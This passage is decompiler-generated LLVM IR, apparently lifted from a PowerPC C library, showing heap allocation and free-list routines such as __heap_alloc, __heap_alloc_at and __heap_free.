  br i1 %v3_1000b088, label %dec_label_pc_1000b094, label %dec_label_pc_1000b0a0

dec_label_pc_1000b094:                            ; preds = %dec_label_pc_1000b088, %dec_label_pc_1000b07c
  %storemerge = phi i32 [ 0, %dec_label_pc_1000b07c ], [ %v0_1000b060, %dec_label_pc_1000b088 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268480664, i32* @lr, align 4
  %v0_1000b094 = call i32 @malloc()
  store i32 %v0_1000b094, i32* @r28, align 4
  br label %dec_label_pc_1000b178

dec_label_pc_1000b0a0:                            ; preds = %dec_label_pc_1000b088
  %v1_1000b0a0 = add i32 %v0_1000b060, 7
  %v1_1000b0a4 = add i32 %arg1, -4
  store i32 %v1_1000b0a4, i32* %r27.global-to-local, align 4
  %v1_1000b0a8 = call i32 @__asm_rlwinm(i32 %v1_1000b0a0, i32 0, i32 0, i32 29)
  store i32 %v1_1000b0a8, i32* %r31.global-to-local, align 4
  %v2_1000b0ac = inttoptr i32 %v1_1000b0a4 to i32*
  %v3_1000b0ac = load i32, i32* %v2_1000b0ac, align 4
  store i32 %v3_1000b0ac, i32* @r30, align 4
  %v2_1000b0b0 = icmp ugt i32 %v1_1000b0a8, 11
  br i1 %v2_1000b0b0, label %dec_label_pc_1000b0bc, label %dec_label_pc_1000b0b8

dec_label_pc_1000b0b8:                            ; preds = %dec_label_pc_1000b0a0
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b0bc

dec_label_pc_1000b0bc:                            ; preds = %dec_label_pc_1000b0a0, %dec_label_pc_1000b0b8
  %v0_1000b13c = phi i32 [ %v1_1000b0a8, %dec_label_pc_1000b0a0 ], [ 12, %dec_label_pc_1000b0b8 ]
  %v3_1000b0bc = icmp ugt i32 %v0_1000b13c, %v3_1000b0ac
  br i1 %v3_1000b0bc, label %dec_label_pc_1000b0c4, label %dec_label_pc_1000b13c

dec_label_pc_1000b0c4:                            ; preds = %dec_label_pc_1000b0bc
  store i32 ptrtoint (i32* @global_var_100297a0.330 to i32), i32* @r29, align 4
  %v0_1000b0d0 = call i32 @__pthread_return_0()
  %v0_1000b0d8 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000b0d8 = load i32, i32* @r30, align 4
  %v2_1000b0d8 = add i32 %v1_1000b0d8, %v0_1000b0d8
  %v1_1000b0dc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b0dc = sub i32 %v1_1000b0dc, %v1_1000b0d8
  %v4_1000b0e4 = call i32 @__heap_alloc_at(i32* nonnull @global_var_10023500, i32 %v2_1000b0d8, i32 %v2_1000b0dc)
  store i32 %v4_1000b0e4, i32* %r27.global-to-local, align 4
  %v0_1000b0f0 = call i32 @__pthread_return_0()
  %v3_1000b0f4 = icmp eq i32 %v4_1000b0e4, 0
  br i1 %v3_1000b0f4, label %dec_label_pc_1000b108, label %dec_label_pc_1000b0fc

dec_label_pc_1000b0fc:                            ; preds = %dec_label_pc_1000b0c4
  %v0_1000b0fc = load i32, i32* @r30, align 4
  %v2_1000b0fc = add i32 %v0_1000b0fc, %v4_1000b0e4
  %v1_1000b100 = load i32, i32* @r28, align 4
  %v2_1000b100 = add i32 %v1_1000b100, -4
  %v3_1000b100 = inttoptr i32 %v2_1000b100 to i32*
  store i32 %v2_1000b0fc, i32* %v3_1000b100, align 4
  br label %dec_label_pc_1000b178

dec_label_pc_1000b108:                            ; preds = %dec_label_pc_1000b0c4
  %v0_1000b108 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b108 = add i32 %v0_1000b108, -4
  store i32 %v1_1000b108, i32* @r3, align 4
  store i32 268480784, i32* @lr, align 4
  %v0_1000b10c = call i32 @malloc()
  store i32 %v0_1000b10c, i32* @r3, align 4
  store i32 %v0_1000b10c, i32* @r31, align 4
  %v3_1000b110 = icmp eq i32 %v0_1000b10c, 0
  br i1 %v3_1000b110, label %dec_label_pc_1000b118, label %dec_label_pc_1000b120

dec_label_pc_1000b118:                            ; preds = %dec_label_pc_1000b108
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000b178

dec_label_pc_1000b120:                            ; preds = %dec_label_pc_1000b108
  %v0_1000b120 = load i32, i32* @r28, align 4
  store i32 %v0_1000b120, i32* @r4, align 4
  %v0_1000b124 = load i32, i32* @r30, align 4
  %v1_1000b124 = add i32 %v0_1000b124, -4
  store i32 %v1_1000b124, i32* @r5, align 4
  store i32 268480812, i32* @lr, align 4
  %v0_1000b128 = call i32 @memcpy()
  %v0_1000b12c = load i32, i32* @r28, align 4
  store i32 %v0_1000b12c, i32* @r3, align 4
  store i32 268480820, i32* @lr, align 4
  %v0_1000b130 = call i32 @free()
  %v0_1000b134 = load i32, i32* @r31, align 4
  store i32 %v0_1000b134, i32* @r28, align 4
  br label %dec_label_pc_1000b178

dec_label_pc_1000b13c:                            ; preds = %dec_label_pc_1000b0bc
  %v1_1000b13c = add i32 %v0_1000b13c, 28
  %v3_1000b140 = icmp ugt i32 %v1_1000b13c, %v3_1000b0ac
  br i1 %v3_1000b140, label %dec_label_pc_1000b178, label %dec_label_pc_1000b148

dec_label_pc_1000b148:                            ; preds = %dec_label_pc_1000b13c
  store i32 ptrtoint (i32* @global_var_100297a0.330 to i32), i32* @r29, align 4
  %v0_1000b154 = call i32 @__pthread_return_0()
  %v0_1000b15c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000b15c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b15c = add i32 %v1_1000b15c, %v0_1000b15c
  %v1_1000b160 = load i32, i32* @r30, align 4
  %v2_1000b160 = sub i32 %v1_1000b160, %v1_1000b15c
  store i32 268480876, i32* @lr, align 4
  %v4_1000b168 = call i32 @__heap_free(i32* nonnull @global_var_10023500, i32 %v2_1000b15c, i32 %v2_1000b160)
  %v0_1000b170 = call i32 @__pthread_return_0()
  %v0_1000b174 = load i32, i32* @r31, align 4
  %v1_1000b174 = load i32, i32* @r28, align 4
  %v2_1000b174 = add i32 %v1_1000b174, -4
  %v3_1000b174 = inttoptr i32 %v2_1000b174 to i32*
  store i32 %v0_1000b174, i32* %v3_1000b174, align 4
  br label %dec_label_pc_1000b178

dec_label_pc_1000b178:                            ; preds = %dec_label_pc_1000b13c, %dec_label_pc_1000b120, %dec_label_pc_1000b118, %dec_label_pc_1000b0fc, %dec_label_pc_1000b094, %dec_label_pc_1000b148
  %v0_1000b17c = load i32, i32* @r28, align 4
  ret i32 %v0_1000b17c

; uselistorder directives
  uselistorder i32 %v1_1000b15c, { 1, 0 }
  uselistorder i32 %v4_1000b0e4, { 1, 0, 2 }
  uselistorder i32 %v1_1000b0d8, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_10023500, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000b178, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000b0bc, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_1000b190 = inttoptr i32 %arg2 to i32*
  %v2_1000b190 = load i32, i32* %v1_1000b190, align 4
  %v1_1000b194 = add i32 %v2_1000b190, 3
  store i32 %v1_1000b194, i32* %r9.global-to-local, align 4
  %v1_1000b198 = call i32 @__asm_rlwinm(i32 %v1_1000b194, i32 0, i32 0, i32 29)
  %v2_1000b19c = icmp ugt i32 %v1_1000b198, 11
  br i1 %v2_1000b19c, label %dec_label_pc_1000b220.preheader, label %dec_label_pc_1000b1a4

dec_label_pc_1000b1a4:                            ; preds = %entry
  br label %dec_label_pc_1000b220.preheader

dec_label_pc_1000b220.preheader:                  ; preds = %entry, %dec_label_pc_1000b1a4
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000b1a4 ], [ %v1_1000b198, %entry ]
  %v0_1000b204 = phi i32 [ 12, %dec_label_pc_1000b1a4 ], [ %v1_1000b198, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000b2205 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000b2205, label %dec_label_pc_1000b228, label %dec_label_pc_1000b1b0

dec_label_pc_1000b1b0:                            ; preds = %dec_label_pc_1000b220.preheader, %dec_label_pc_1000b21c
  %v0_1000b21c = phi i32 [ %storemerge, %dec_label_pc_1000b21c ], [ %storemerge2, %dec_label_pc_1000b220.preheader ]
  %v1_1000b1b0 = inttoptr i32 %v0_1000b21c to i32*
  %v2_1000b1b0 = load i32, i32* %v1_1000b1b0, align 4
  store i32 %v2_1000b1b0, i32* %r10.global-to-local, align 4
  %v2_1000b1b4 = icmp ult i32 %v2_1000b1b0, %v0_1000b204
  br i1 %v2_1000b1b4, label %dec_label_pc_1000b21c, label %dec_label_pc_1000b1bc

dec_label_pc_1000b1bc:                            ; preds = %dec_label_pc_1000b1b0
  %v1_1000b1bc = add i32 %v0_1000b204, 44
  %v2_1000b1c0 = icmp ult i32 %v2_1000b1b0, %v1_1000b1bc
  br i1 %v2_1000b1c0, label %dec_label_pc_1000b1c8, label %dec_label_pc_1000b204

dec_label_pc_1000b1c8:                            ; preds = %dec_label_pc_1000b1bc
  %v1_1000b1c8 = add i32 %v0_1000b21c, 4
  %v2_1000b1c8 = inttoptr i32 %v1_1000b1c8 to i32*
  %v3_1000b1c8 = load i32, i32* %v2_1000b1c8, align 4
  store i32 %v3_1000b1c8, i32* %r11.global-to-local, align 4
  %v3_1000b1cc = icmp eq i32 %v3_1000b1c8, 0
  br i1 %v3_1000b1cc, label %dec_label_pc_1000b1dc, label %dec_label_pc_1000b1d4

dec_label_pc_1000b1d4:                            ; preds = %dec_label_pc_1000b1c8
  %v1_1000b1d4 = add i32 %v0_1000b21c, 8
  %v2_1000b1d4 = inttoptr i32 %v1_1000b1d4 to i32*
  %v3_1000b1d4 = load i32, i32* %v2_1000b1d4, align 4
  %v2_1000b1d8 = add i32 %v3_1000b1c8, 8
  %v3_1000b1d8 = inttoptr i32 %v2_1000b1d8 to i32*
  store i32 %v3_1000b1d4, i32* %v3_1000b1d8, align 4
  %v0_1000b1dc.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000b1f8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b1dc

dec_label_pc_1000b1dc:                            ; preds = %dec_label_pc_1000b1c8, %dec_label_pc_1000b1d4
  %v0_1000b1f8 = phi i32 [ %v2_1000b1b0, %dec_label_pc_1000b1c8 ], [ %v0_1000b1f8.pre, %dec_label_pc_1000b1d4 ]
  %v0_1000b1dc = phi i32 [ %v0_1000b21c, %dec_label_pc_1000b1c8 ], [ %v0_1000b1dc.pre, %dec_label_pc_1000b1d4 ]
  %v1_1000b1dc = add i32 %v0_1000b1dc, 8
  %v2_1000b1dc = inttoptr i32 %v1_1000b1dc to i32*
  %v3_1000b1dc = load i32, i32* %v2_1000b1dc, align 4
  store i32 %v3_1000b1dc, i32* @r8, align 4
  %v1_1000b1e0 = add i32 %v0_1000b1dc, 4
  %v2_1000b1e0 = inttoptr i32 %v1_1000b1e0 to i32*
  %v3_1000b1e0 = load i32, i32* %v2_1000b1e0, align 4
  %v3_1000b1e4 = icmp eq i32 %v3_1000b1dc, 0
  store i32 %v0_1000b1f8, i32* %r11.global-to-local, align 4
  br i1 %v3_1000b1e4, label %dec_label_pc_1000b1f8, label %dec_label_pc_1000b1ec

dec_label_pc_1000b1ec:                            ; preds = %dec_label_pc_1000b1dc
  %v2_1000b1f0 = add i32 %v3_1000b1dc, 4
  %v3_1000b1f0 = inttoptr i32 %v2_1000b1f0 to i32*
  store i32 %v3_1000b1e0, i32* %v3_1000b1f0, align 4
  br label %dec_label_pc_1000b20c

dec_label_pc_1000b1f8:                            ; preds = %dec_label_pc_1000b1dc
  store i32 %v3_1000b1e0, i32* %arg1, align 4
  br label %dec_label_pc_1000b20c

dec_label_pc_1000b204:                            ; preds = %dec_label_pc_1000b1bc
  %v2_1000b204 = sub i32 %v2_1000b1b0, %v0_1000b204
  store i32 %v2_1000b204, i32* %v1_1000b1b0, align 4
  br label %dec_label_pc_1000b20c

dec_label_pc_1000b20c:                            ; preds = %dec_label_pc_1000b1f8, %dec_label_pc_1000b1ec, %dec_label_pc_1000b204
  %v0_1000b20c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b20c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b20c = sub i32 %v1_1000b20c, %v0_1000b20c
  store i32 %v2_1000b20c, i32* %r9.global-to-local, align 4
  %v0_1000b210 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b210, i32* %v1_1000b190, align 4
  %v0_1000b214 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b214 = add i32 %v0_1000b214, 12
  ret i32 %v1_1000b214

dec_label_pc_1000b21c:                            ; preds = %dec_label_pc_1000b1b0
  %v1_1000b21c = add i32 %v0_1000b21c, 4
  %storemerge.in = inttoptr i32 %v1_1000b21c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000b220 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000b220, label %dec_label_pc_1000b220.dec_label_pc_1000b228_crit_edge, label %dec_label_pc_1000b1b0

dec_label_pc_1000b220.dec_label_pc_1000b228_crit_edge: ; preds = %dec_label_pc_1000b21c
  br label %dec_label_pc_1000b228

dec_label_pc_1000b228:                            ; preds = %dec_label_pc_1000b220.dec_label_pc_1000b228_crit_edge, %dec_label_pc_1000b220.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000b1dc, { 1, 0 }
  uselistorder i32 %v2_1000b1b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000b21c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000b204, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 4, 6, 3 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000b20c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b1dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b220.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000b230 = load i32, i32* %arg1, align 4
  store i32 %v2_1000b230, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_1000b238 = add i32 %arg3, 3
  %v3_1000b2bc3 = icmp eq i32 %v2_1000b230, 0
  br i1 %v3_1000b2bc3, label %dec_label_pc_1000b2c4, label %dec_label_pc_1000b240

dec_label_pc_1000b240:                            ; preds = %entry, %dec_label_pc_1000b2b8
  %v0_1000b2b8 = phi i32 [ %v3_1000b2b8, %dec_label_pc_1000b2b8 ], [ %v2_1000b230, %entry ]
  %v1_1000b240 = inttoptr i32 %v0_1000b2b8 to i32*
  %v2_1000b240 = load i32, i32* %v1_1000b240, align 4
  %v2_1000b244 = sub i32 %v0_1000b2b8, %v2_1000b240
  %v1_1000b248 = add i32 %v2_1000b244, 12
  %v3_1000b24c = icmp ugt i32 %v1_1000b248, %arg2
  br i1 %v3_1000b24c, label %dec_label_pc_1000b2b8, label %dec_label_pc_1000b254

dec_label_pc_1000b254:                            ; preds = %dec_label_pc_1000b240
  %v4_1000b24c = icmp eq i32 %v1_1000b248, %arg2
  br i1 %v4_1000b24c, label %dec_label_pc_1000b25c, label %dec_label_pc_1000b2c4

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000b254
  %v1_1000b25c = call i32 @__asm_rlwinm(i32 %v1_1000b238, i32 0, i32 0, i32 29)
  %v2_1000b260 = icmp ult i32 %v2_1000b240, %v1_1000b25c
  br i1 %v2_1000b260, label %dec_label_pc_1000b2c4, label %dec_label_pc_1000b268

dec_label_pc_1000b268:                            ; preds = %dec_label_pc_1000b25c
  %v1_1000b268 = add i32 %v1_1000b25c, 44
  %v2_1000b26c = icmp ult i32 %v2_1000b240, %v1_1000b268
  br i1 %v2_1000b26c, label %dec_label_pc_1000b274, label %dec_label_pc_1000b2a8

dec_label_pc_1000b274:                            ; preds = %dec_label_pc_1000b268
  %v0_1000b274 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b274 = add i32 %v0_1000b274, 4
  %v2_1000b274 = inttoptr i32 %v1_1000b274 to i32*
  %v3_1000b274 = load i32, i32* %v2_1000b274, align 4
  %v3_1000b278 = icmp eq i32 %v3_1000b274, 0
  br i1 %v3_1000b278, label %dec_label_pc_1000b288, label %dec_label_pc_1000b280

dec_label_pc_1000b280:                            ; preds = %dec_label_pc_1000b274
  %v1_1000b280 = add i32 %v0_1000b274, 8
  %v2_1000b280 = inttoptr i32 %v1_1000b280 to i32*
  %v3_1000b280 = load i32, i32* %v2_1000b280, align 4
  %v2_1000b284 = add i32 %v3_1000b274, 8
  %v3_1000b284 = inttoptr i32 %v2_1000b284 to i32*
  store i32 %v3_1000b280, i32* %v3_1000b284, align 4
  %v0_1000b288.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000b288

dec_label_pc_1000b288:                            ; preds = %dec_label_pc_1000b274, %dec_label_pc_1000b280
  %v0_1000b288 = phi i32 [ %v0_1000b274, %dec_label_pc_1000b274 ], [ %v0_1000b288.pre, %dec_label_pc_1000b280 ]
  %v1_1000b288 = add i32 %v0_1000b288, 8
  %v2_1000b288 = inttoptr i32 %v1_1000b288 to i32*
  %v3_1000b288 = load i32, i32* %v2_1000b288, align 4
  %v1_1000b28c = add i32 %v0_1000b288, 4
  %v2_1000b28c = inttoptr i32 %v1_1000b28c to i32*
  %v3_1000b28c = load i32, i32* %v2_1000b28c, align 4
  %v3_1000b290 = icmp eq i32 %v3_1000b288, 0
  br i1 %v3_1000b290, label %dec_label_pc_1000b2a0, label %dec_label_pc_1000b298

dec_label_pc_1000b298:                            ; preds = %dec_label_pc_1000b288
  %v2_1000b298 = add i32 %v3_1000b288, 4
  %v3_1000b298 = inttoptr i32 %v2_1000b298 to i32*
  store i32 %v3_1000b28c, i32* %v3_1000b298, align 4
  ret i32 %v2_1000b240

dec_label_pc_1000b2a0:                            ; preds = %dec_label_pc_1000b288
  %v1_1000b2a0 = load i32, i32* @r8, align 4
  %v2_1000b2a0 = inttoptr i32 %v1_1000b2a0 to i32*
  store i32 %v3_1000b28c, i32* %v2_1000b2a0, align 4
  ret i32 %v2_1000b240

dec_label_pc_1000b2a8:                            ; preds = %dec_label_pc_1000b268
  %v2_1000b2a8 = sub i32 %v2_1000b240, %v1_1000b25c
  %v1_1000b2b0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b2b0 = inttoptr i32 %v1_1000b2b0 to i32*
  store i32 %v2_1000b2a8, i32* %v2_1000b2b0, align 4
  ret i32 %v1_1000b25c

dec_label_pc_1000b2b8:                            ; preds = %dec_label_pc_1000b240
  %v1_1000b2b8 = add i32 %v0_1000b2b8, 4
  %v2_1000b2b8 = inttoptr i32 %v1_1000b2b8 to i32*
  %v3_1000b2b8 = load i32, i32* %v2_1000b2b8, align 4
  store i32 %v3_1000b2b8, i32* %r11.global-to-local, align 4
  %v3_1000b2bc = icmp eq i32 %v3_1000b2b8, 0
  br i1 %v3_1000b2bc, label %dec_label_pc_1000b2bc.dec_label_pc_1000b2c4.loopexit_crit_edge, label %dec_label_pc_1000b240

dec_label_pc_1000b2bc.dec_label_pc_1000b2c4.loopexit_crit_edge: ; preds = %dec_label_pc_1000b2b8
  br label %dec_label_pc_1000b2c4

dec_label_pc_1000b2c4:                            ; preds = %entry, %dec_label_pc_1000b2bc.dec_label_pc_1000b2c4.loopexit_crit_edge, %dec_label_pc_1000b254, %dec_label_pc_1000b25c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000b2b8, { 1, 2, 0 }
  uselistorder i32 %v0_1000b288, { 1, 0 }
  uselistorder i32 %v1_1000b25c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000b240, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %v0_1000b2b8, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2c4, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000b288, { 1, 0 }
  uselistorder label %dec_label_pc_1000b240, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000b2cc = icmp eq i32 %arg3, 0
  %v2_1000b2d0 = add i32 %arg2, 4
  %v3_1000b2d0 = inttoptr i32 %v2_1000b2d0 to i32*
  store i32 %arg4, i32* %v3_1000b2d0, align 4
  %v2_1000b2d4 = add i32 %arg2, 8
  %v3_1000b2d4 = inttoptr i32 %v2_1000b2d4 to i32*
  store i32 %arg3, i32* %v3_1000b2d4, align 4
  br i1 %v3_1000b2cc, label %dec_label_pc_1000b2e4, label %dec_label_pc_1000b2dc

dec_label_pc_1000b2dc:                            ; preds = %entry
  %v2_1000b2dc = add i32 %arg3, 4
  %v3_1000b2dc = inttoptr i32 %v2_1000b2dc to i32*
  store i32 %arg2, i32* %v3_1000b2dc, align 4
  br label %dec_label_pc_1000b2e8

dec_label_pc_1000b2e4:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000b2e8

dec_label_pc_1000b2e8:                            ; preds = %dec_label_pc_1000b2dc, %dec_label_pc_1000b2e4
  %v3_1000b2e8 = icmp eq i32 %arg4, 0
  %v0_1000b2ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000b2e8, i32 %v0_1000b2ec)
  %v2_1000b2f0 = add i32 %arg4, 8
  %v3_1000b2f0 = inttoptr i32 %v2_1000b2f0 to i32*
  store i32 %arg2, i32* %v3_1000b2f0, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 4, 3 }
  uselistorder label %dec_label_pc_1000b2e8, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000b2f8 = icmp eq i32 %arg3, 0
  br i1 %v3_1000b2f8, label %dec_label_pc_1000b308, label %dec_label_pc_1000b300

dec_label_pc_1000b300:                            ; preds = %entry
  %v2_1000b300 = add i32 %arg3, 4
  %v3_1000b300 = inttoptr i32 %v2_1000b300 to i32*
  store i32 %arg2, i32* %v3_1000b300, align 4
  br label %dec_label_pc_1000b30c

dec_label_pc_1000b308:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000b30c

dec_label_pc_1000b30c:                            ; preds = %dec_label_pc_1000b300, %dec_label_pc_1000b308
  %v2_1000b30c = add i32 %arg2, 8
  %v3_1000b30c = inttoptr i32 %v2_1000b30c to i32*
  store i32 %arg3, i32* %v3_1000b30c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b30c, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000b32c = load i32, i32* %arg1, align 4
  store i32 %v2_1000b32c, i32* @r31, align 4
  %v2_1000b330 = add i32 %arg3, %arg2
  store i32 %v2_1000b330, i32* %r3.global-to-local, align 4
  %v3_1000b3447 = icmp eq i32 %v2_1000b32c, 0
  %v1_1000b3488 = add i32 %v2_1000b32c, 12
  %tmp69 = icmp uge i32 %v1_1000b3488, %arg2
  %or.cond10 = or i1 %v3_1000b3447, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000b354, label %dec_label_pc_1000b33c

dec_label_pc_1000b33c:                            ; preds = %entry, %dec_label_pc_1000b33c
  %v0_1000b39c11 = phi i32 [ %v3_1000b340, %dec_label_pc_1000b33c ], [ %v2_1000b32c, %entry ]
  store i32 %v0_1000b39c11, i32* %r11.global-to-local, align 4
  %v1_1000b340 = add i32 %v0_1000b39c11, 4
  %v2_1000b340 = inttoptr i32 %v1_1000b340 to i32*
  %v3_1000b340 = load i32, i32* %v2_1000b340, align 4
  store i32 %v3_1000b340, i32* @r31, align 4
  %v3_1000b344 = icmp eq i32 %v3_1000b340, 0
  %v1_1000b348 = add i32 %v3_1000b340, 12
  %tmp6 = icmp uge i32 %v1_1000b348, %arg2
  %or.cond = or i1 %v3_1000b344, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000b354, label %dec_label_pc_1000b33c

dec_label_pc_1000b354:                            ; preds = %dec_label_pc_1000b33c, %entry
  %v0_1000b390.lcssa = phi i32 [ 0, %entry ], [ %v0_1000b39c11, %dec_label_pc_1000b33c ]
  %v0_1000b39c.lcssa = phi i32 [ %v2_1000b32c, %entry ], [ %v3_1000b340, %dec_label_pc_1000b33c ]
  %v3_1000b344.lcssa = phi i1 [ %v3_1000b3447, %entry ], [ %v3_1000b344, %dec_label_pc_1000b33c ]
  br i1 %v3_1000b344.lcssa, label %dec_label_pc_1000b40c, label %dec_label_pc_1000b35c

dec_label_pc_1000b35c:                            ; preds = %dec_label_pc_1000b354
  %v1_1000b35c = inttoptr i32 %v0_1000b39c.lcssa to i32*
  %v2_1000b35c = load i32, i32* %v1_1000b35c, align 4
  %v2_1000b360 = sub i32 %v0_1000b39c.lcssa, %v2_1000b35c
  %v1_1000b364 = add i32 %v2_1000b360, 12
  %v3_1000b368 = icmp ugt i32 %v1_1000b364, %v2_1000b330
  br i1 %v3_1000b368, label %dec_label_pc_1000b40c, label %dec_label_pc_1000b370

dec_label_pc_1000b370:                            ; preds = %dec_label_pc_1000b35c
  %v4_1000b368 = icmp eq i32 %v1_1000b364, %v2_1000b330
  %v2_1000b374 = add i32 %v2_1000b35c, %arg3
  store i32 %v2_1000b374, i32* @r29, align 4
  br i1 %v4_1000b368, label %dec_label_pc_1000b37c, label %dec_label_pc_1000b3ac

dec_label_pc_1000b37c:                            ; preds = %dec_label_pc_1000b370
  %v3_1000b37c = icmp eq i32 %v0_1000b390.lcssa, 0
  br i1 %v3_1000b37c, label %dec_label_pc_1000b400, label %dec_label_pc_1000b384

dec_label_pc_1000b384:                            ; preds = %dec_label_pc_1000b37c
  %v1_1000b384 = add i32 %v0_1000b390.lcssa, 12
  %v4_1000b388 = icmp eq i32 %v1_1000b384, %arg2
  br i1 %v4_1000b388, label %dec_label_pc_1000b390, label %dec_label_pc_1000b400

dec_label_pc_1000b390:                            ; preds = %dec_label_pc_1000b384
  %v1_1000b390 = inttoptr i32 %v0_1000b390.lcssa to i32*
  %v2_1000b390 = load i32, i32* %v1_1000b390, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000b398 = add i32 %v0_1000b390.lcssa, 8
  %v2_1000b398 = inttoptr i32 %v1_1000b398 to i32*
  %v3_1000b398 = load i32, i32* %v2_1000b398, align 4
  %v2_1000b3a0 = add i32 %v2_1000b390, %v2_1000b374
  store i32 %v2_1000b3a0, i32* @r29, align 4
  %v5_1000b3a4 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000b39c.lcssa, i32 %v3_1000b398, i32 %v2_1000b330)
  store i32 %v5_1000b3a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b400

dec_label_pc_1000b3ac:                            ; preds = %dec_label_pc_1000b370
  %v1_1000b3ac = add i32 %v0_1000b39c.lcssa, 4
  %v2_1000b3ac = inttoptr i32 %v1_1000b3ac to i32*
  %v3_1000b3ac = load i32, i32* %v2_1000b3ac, align 4
  %v3_1000b3b0 = icmp eq i32 %v3_1000b3ac, 0
  br i1 %v3_1000b3b0, label %dec_label_pc_1000b3e8, label %dec_label_pc_1000b3b8

dec_label_pc_1000b3b8:                            ; preds = %dec_label_pc_1000b3ac
  %v1_1000b3b8 = inttoptr i32 %v3_1000b3ac to i32*
  %v2_1000b3b8 = load i32, i32* %v1_1000b3b8, align 4
  %v2_1000b3bc = sub i32 %v3_1000b3ac, %v2_1000b3b8
  %v1_1000b3c0 = add i32 %v2_1000b3bc, 12
  %v4_1000b3c4 = icmp eq i32 %v2_1000b330, %v1_1000b3c0
  br i1 %v4_1000b3c4, label %dec_label_pc_1000b3cc, label %dec_label_pc_1000b3e8

dec_label_pc_1000b3cc:                            ; preds = %dec_label_pc_1000b3b8
  store i32 %tmp, i32* %r3.global-to-local, align 4
